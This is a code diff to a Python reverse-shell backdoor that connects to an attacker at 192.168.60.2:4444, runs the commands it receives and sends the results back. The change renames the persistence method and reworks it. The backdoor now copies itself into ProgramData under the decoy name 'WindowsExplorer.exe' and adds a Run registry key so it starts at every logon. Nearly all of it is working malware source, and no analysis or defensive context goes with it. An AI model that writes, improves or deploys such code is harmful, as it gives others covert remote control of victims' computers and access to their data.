@@ -3,7 +3,7 @@ import socket, subprocess, os, json, base64, sys, shutil
 class Backdoor:
 
     def __init__(self, ip, port):
-        self.become_persistant()
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     
@@ -74,12 +74,22 @@ class Backdoor:
                 command_result = "[-] Error during command execution"
             self.reliable_send(command_result)# Send the result back to the attacker
 
-    def become_persistant(self):
-        evil_file_location = os.getenv("appdata") + "\\Windows Explorer.exe"
-        if not os.path.exists(evil_file_location):
-            shutil.copyfile(sys.executable, evil_file_location)
-            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{evil_file_location}"', shell=True)
+    def become_persistent(self):
+        # Define a location in ProgramData (which is persistent across reboots)
+        evil_file_location = os.path.join(os.environ["ProgramData"], "MyApp", "WindowsExplorer.exe")
 
+        # Ensure the target directory exists
+        if not os.path.exists(os.path.dirname(evil_file_location)):
+            os.makedirs(os.path.dirname(evil_file_location))
+
+        # Check if the file already exists at the target location
+        if not os.path.exists(evil_file_location):
+            # Copy the current executable to the target location
+            shutil.copyfile(sys.executable, evil_file_location)
+
+            # Create a registry entry to ensure the program runs on startup
+            # (This does not require admin privileges, unless you're adding to HKLM)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "{evil_file_location}"', shell=True)
 try:
     my_backdoor = Backdoor("192.168.60.2", 4444)
     my_backdoor.run()
